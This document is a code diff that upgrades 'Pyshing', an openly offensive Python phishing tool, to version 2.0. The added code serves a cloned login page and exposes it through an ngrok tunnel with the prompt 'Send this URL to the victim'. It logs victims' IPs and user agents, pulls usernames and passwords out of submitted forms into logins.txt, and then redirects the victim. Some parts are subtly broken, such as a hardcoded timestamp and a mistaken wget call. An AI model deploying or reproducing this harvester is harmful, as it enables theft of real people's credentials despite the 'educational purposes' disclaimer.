@@ -1,15 +1,142 @@
 #!/usr/bin/python
 '''
-Name: Pyshing v1.3
-Version: Python 3.7.4
--
+Name: Pyshing v2.0
+Version: Python 3.9.2
+
+--
 The tool is for educational purposes
--
-https://igor-m-martins.github.io
+the author is not responsible for misuse of this software!
+--
+
+Website: https://igor-m-martins.github.io
+
 Author: Igor M. Martins
 '''
-import core.server
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
+import subprocess
+from io import BytesIO
 import urllib.request
+from urllib.parse import unquote
+import json
+import wget
+import re
+import os
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    
+    ips = []
+
+    def run():
+        try:
+          port = input(BLUE+BOLD+"Port number [Default 1337]: "+ENDC)
+          if not port:
+            port = 1337
+          httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
+          if choice.upper() == 'Y':
+            print(BLUE+BOLD+"Initializing ngrok reverse proxy"+ENDC)
+            os.system(f'ngrok http {port} > /dev/null &')
+            os.system('curl --silent http://localhost:4040/api/tunnels > tunnels.json')
+            tunnel = open('tunnels.json','r')
+            data = json.load(tunnel)
+            address = data['tunnels'][0]
+            print(BOLD+RED+f"\n[+] Send this URL to the victim: {address['public_url']}"+ENDC)
+
+          while True:
+              print(BLUE+'\n.::Listening on local port %s...\n'%(port)+ENDC)
+              httpd.serve_forever()
+        
+        except OSError:
+            print(RED+"Adress already in use!\n"+ENDC)
+            quit()
+
+    def do_GET(self):
+      self.get_ip()
+      self.send_response(200)
+      self.end_headers()
+      file = open('site/index.html','r')
+      readfile = file.readlines()
+      for lines in readfile:
+        self.wfile.write(lines.encode())
+        
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        body = self.rfile.read(content_length)
+        self.send_response(200)
+        self.end_headers()
+        response = BytesIO()
+        response.write(body)
+        values = response.getvalue()
+        self.getCredentials(values)
+
+    def get_ip(self):
+        log = str(self.headers)
+        
+        data = []
+
+        for line in log.split('\n'):
+          if 'User-Agent' in line:
+            data.append(line.split('User-Agent: ')[1])
+          if 'X-Forwarded-For' in line:
+            data.append(line.split('X-Forwarded-For: ')[1])
+
+        if self.path != '/favicon.ico':
+          if len(data) == 2:
+            if not data[0] in self.ips:
+              date = self.get_time()
+              self.ips.append(data[0])
+              print(BOLD+RED+'[+] IP Found:',data[1]+'\n[+] User-Agent:',data[0],ENDC)
+              file = open('ips.txt','a+')
+              file.write('Date: '+str(date)+' IP: '+str(data[1])+'User-Agent: '+data[0]+'\n')
+          else:
+            print(BOLD+BLUE+'[-] IP NOT FOUND!'+'\n[+] User-Agent:',data[0],ENDC)
+
+    def get_time(self):
+        timestamp = 1545730073
+        timenow = datetime.fromtimestamp(timestamp)
+        return timenow
+
+    def getCredentials(self, values):
+        post = unquote(values.decode('utf-8'))
+        readpost = post.strip('&')
+        if 'enc' in readpost:
+          print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}hash.lst{GREEN} for future hash crack\n"+ENDC)
+        
+        forms = ['email','user','login','pass','encpass'] #Possibles forms to get the credentials
+        
+        readpost = readpost.split('&')
+        count = 0
+        possibles = []
+        file = open('logins.txt','a+')
+        postf = open('post.txt','a+')
+        postf.write(str(readpost)+'\n')
+        for line in readpost:
+          for c in forms:
+            if c in line and re.search("^"+str(c),line):
+              c = str(c)+'='
+              line = line.split(c)
+              possibles.append(line[1])
+              count +=1
+              if count >= 2:
+                print('\n' + BOLD+RED + "=" * 15 + " Possible Credentials " + "=" * 15)
+                print(f'LOGIN: {possibles[0]}\nPASSWORD: {possibles[1]}')
+                print("=" * 52 + "\n"+ENDC)
+                date = self.get_time()
+                file.write(str(date)+' '+str(possibles)+'\n')
+                count = 0
+                possibles = []
+                break
+            
+        self.redirect()
+        file.close()
+
+    def redirect(self):
+        urlf = open('site/redirect.txt','r')
+        url = urlf.readlines()[0]
+        print(BLUE+f"[!] Redirecting to {url}...")
+        redir = "<script>window.location.href=\"%s\"</script>" % (url)
+        self.wfile.write(redir.encode())
+        print('[+] Done!'+ENDC)
 
 class Pyshing():
     def __init__(self):
@@ -18,7 +145,34 @@ class Pyshing():
         if opt == 1:
         	self.pageClone()
         elif opt == 2:
-        	core.server.SimpleHTTPRequestHandler.run()
+          global choice
+          choice = input(GREEN+"Do you want use internet to attack? Y/n: [Default n] ")
+          if choice.upper() == 'Y':
+            print("Searching for ngrok...")
+            proc = subprocess.Popen('ngrok --version', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = proc.stdout.read()
+            if not 'ngrok' in proc.decode('utf-8'):
+              proc = subprocess.Popen('uname -a', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+              proc = proc.stdout.read()
+              print("ngrok not found, trying download")
+              if 'amd64' in proc.decode('utf-8'):
+                wget('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
+                print('extracting...')
+                proc = subprocess.Popen('unzip ngrok-stable-linux-amd64.zip')
+              if 'aarch' in proc or 'arm' in proc:
+                wget('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
+                print('extracting...')
+                proc = subprocess.Popen('unzip ngrok-stable-linux-arm.zip')
+
+              token = input("\nEnter with your Ngrok API Token here: ")
+              os.system('chmod +x ngrok')
+              os.system(f'ngrok authtoken {token}')
+            
+            print("[+] OK\nStarting Pyshing through the internet"+ENDC)
+            SimpleHTTPRequestHandler.run()
+          else:
+            print("Starting Pyshing on localhost"+ENDC)
+            SimpleHTTPRequestHandler.run()
         elif opt == 0:
             quit()
         else:
@@ -59,7 +213,7 @@ banner = BLUE+'''
 .JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
               ,V                                            6'     dP 
            OOb"                                             Ybmmmd'  
-                                             Version: 1.3
+                                             Version: 2.0
                                              Author: Igor M. Martins\n
 '''+ENDC
 
@@ -69,8 +223,11 @@ options = BOLD+GREEN+'''
 '''+ENDC
 
 if __name__ == '__main__':
-    try:
-        print(banner)
-        Pyshing()
-    except KeyboardInterrupt:
-        print("[!] Finished...\n")
+  try:
+    print(banner)
+    Pyshing()
+  except KeyboardInterrupt:
+    if choice.upper() == 'Y':
+      os.system('killall ngrok')
+      print(GREEN+'[!] Ngrok finished'+ENDC)
+    print("[!] Exit program...\n")
